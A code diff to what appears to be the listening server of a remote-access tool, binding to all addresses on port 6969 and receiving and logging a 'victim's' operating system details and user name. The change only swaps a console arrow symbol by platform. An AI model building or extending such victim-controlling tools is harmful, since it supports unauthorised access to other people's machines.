@@ -12,7 +12,10 @@ import logging
 HOST = '0.0.0.0'  # Set as every ip address can connect to the server.
 PORT = 6969  # Set listening port.
 defaultPath = None
-
+if platform.system() == "Windows":
+    arrowSymbol = ""
+else:
+    arrowSymbol = "↴"
 
 # When called, clear the console. If called with True argument, wait for enter to continue.
 def consoleCleaner(enterToContinue):
@@ -440,7 +443,7 @@ consoleCleaner(False)
 # Getting victim's os infos.
 logging.info("Getting os victim infos")
 OsVictimInfos = encrypter.receive_message_server()
-logging.info("Os victim infos ↴\n%s", OsVictimInfos)
+logging.info("Os victim infos "+arrowSymbol+"\n%s", OsVictimInfos)
 # Set the variable defaultpath with victim's default path, and extract the user name.
 user = findUser(OsVictimInfos)
 
